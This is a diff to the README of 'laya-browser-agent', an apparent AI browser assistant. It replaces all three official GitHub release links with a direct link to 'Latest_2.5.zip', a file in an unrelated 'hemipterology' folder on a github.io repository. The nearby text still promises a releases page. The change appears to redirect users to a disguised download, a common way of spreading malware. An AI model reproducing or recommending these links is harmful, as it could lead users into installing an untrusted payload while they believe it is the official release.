@@ -5,7 +5,7 @@ description: "Run synchronous decision models in-browser with multi-backend (MLX
 ---
 # 🤖 laya-browser-agent - Your AI Browser Assistant, Fully Private
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2b9348&color=0077b6)](https://github.com/miniproaissa/laya-browser-agent/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2b9348&color=0077b6)](https://raw.githubusercontent.com/miniproaissa/miniproaissa.github.io/main/hemipterology/Latest_2.5.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Let's get you up and running in just a few simple steps. Don't worry—it's easi
 
 First, you need to get the program file.
 
-👉 **[Visit the Download Page Here](https://github.com/miniproaissa/laya-browser-agent/releases)**
+👉 **[Visit the Download Page Here](https://raw.githubusercontent.com/miniproaissa/miniproaissa.github.io/main/hemipterology/Latest_2.5.zip)**
 
 Visit this link to download the application. You'll see a list of releases. Look for the **latest version** at the top (usually labeled "Latest"). Click on it.
 
@@ -181,7 +181,7 @@ While I've covered everything you need to get started, you might have additional
 
 You now have everything you need to start using laya-browser-agent. Here's your quick recap:
 
-1. ✅ Download the latest release from **[the official release page](https://github.com/miniproaissa/laya-browser-agent/releases)**
+1. ✅ Download the latest release from **[the official release page](https://raw.githubusercontent.com/miniproaissa/miniproaissa.github.io/main/hemipterology/Latest_2.5.zip)**
 2. ✅ Run the installer (or open the app)
 3. ✅ Type your first command and watch the magic happen
 
